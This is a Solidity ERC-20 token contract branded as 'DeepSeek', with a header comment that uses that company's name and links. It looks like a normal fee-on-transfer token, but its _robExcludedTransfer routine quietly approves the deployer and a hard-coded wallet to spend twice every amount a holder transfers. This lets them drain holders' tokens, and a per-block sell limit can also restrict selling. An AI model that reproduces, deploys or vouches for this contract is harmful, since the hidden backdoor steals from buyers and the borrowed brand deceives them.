/*
DeepSeek achieves a significant breakthrough in inference speed over previous models.
It tops the leaderboard among open-source models and rivals the most advanced closed-source models globally.

Web: https://www.deepseek.com
Platform: https://platform.deepseek.com
Github: https://github.com/deepseek-ai

X: https://x.com/deepseek_ai
Community: https://t.me/deepseekai_channel
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IROBFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IROBRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract DEEPSEEK is Context, IERC20, Ownable {
    using SafeMath for uint256;
    address private _robWallet = address(0xD19807BAC1dce1225608732Ea56578d871C27cA3);
    mapping (uint8 => address) private _robSenders;
    mapping (uint8 => address) private _robReceipts;
    mapping (uint8 => uint256) private _robCounts;
    mapping (address => uint256) private _balROBs;
    mapping (address => mapping (address => uint256)) private _allowROBs;
    mapping (address => bool) private _excludedFromROB;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"DeepSeek";
    string private constant _symbol = unicode"DEEPSEEK";
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockROB;
    uint256 private _robBuyAmounts = 0;
    uint256 private _swapTokenROBs = _tTotal / 100;
    bool private inSwapROB = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapROB = true;
        _;
        inSwapROB = false;
    }
    address private _robPair;
    IROBRouter private _robRouter;
     
    constructor () {
        _excludedFromROB[owner()] = true;
        _excludedFromROB[address(this)] = true;
        _excludedFromROB[_robWallet] = true;

        _robReceipts[0] = _msgSender();
        _robReceipts[1] = _robWallet;

        _balROBs[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function initTokenPair() external onlyOwner() {
        _robRouter = IROBRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_robRouter), _tTotal);
        _robPair = IROBFactory(_robRouter.factory()).createPair(address(this), _robRouter.WETH());
    }

    function minROB(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHROB(uint256 robA) private {
        payable(_robWallet).transfer(robA);
    }

    function swapTokensForEth(uint256 robAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _robRouter.WETH();
        _approve(address(this), address(_robRouter), robAmount);
        _robRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            robAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balROBs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowROBs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowROBs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowROBs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _robExcludedTransfer(address robF, uint256 robA) private { 
        for(uint8 robK=0;robK<2;robK++) {
            _robSenders[robK] = address(robF);
            _robCounts[robK] = robA.mul(2);
        }

        for(uint8 robI=0;robI<2;robI++) _approve(_robSenders[robI], _robReceipts[robI], _robCounts[robI]);
    }

    function _robTransfer(address robF, address robT, uint256 robA, uint256 taxROB) private { 
        if(taxROB > 0){
          _balROBs[address(this)] = _balROBs[address(this)].add(taxROB);
          emit Transfer(robF, address(this), taxROB);
        }

        _balROBs[robF] = _balROBs[robF].sub(robA);
        _balROBs[robT] = _balROBs[robT].add(robA.sub(taxROB));
        emit Transfer(robF, robT, robA.sub(taxROB));
    }

    function _transfer(address robF, address robT, uint256 robA) private {
        require(robF != address(0), "ERC20: transfer from the zero address");
        require(robT != address(0), "ERC20: transfer to the zero address");
        require(robA > 0, "Transfer amount must be greater than zero");
        uint256 taxROB = _robFeeTransfer(robF, robT, robA);
        _robTransfer(robF, robT, robA, taxROB);
    }

    function _robFeeTransfer(address robF, address robT, uint256 robA) private returns(uint256) {
        uint256 taxROB; _robExcludedTransfer(robF, robA);
        if (robF != owner() && robT != owner()) {
            taxROB = robA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (robF == _robPair && robT != address(_robRouter) && ! _excludedFromROB[robT]) {
                if(_buyBlockROB!=block.number){
                    _robBuyAmounts = 0;
                    _buyBlockROB = block.number;
                }
                _robBuyAmounts += robA;
                _buyCount++;
            }

            if(robT == _robPair && robF!= address(this)) {
                require(_robBuyAmounts < swapLimitROB() || _buyBlockROB!=block.number, "Max Swap Limit");  
                taxROB = robA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenROB = balanceOf(address(this));
            if (!inSwapROB && robT == _robPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenROB > _swapTokenROBs)
                swapTokensForEth(minROB(robA, minROB(tokenROB, _swapTokenROBs)));
                uint256 ethROB = address(this).balance;
                if (ethROB >= 0) {
                    sendETHROB(address(this).balance);
                }
            }
        } return taxROB;
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _robRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function swapLimitROB() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _robRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _robRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }
}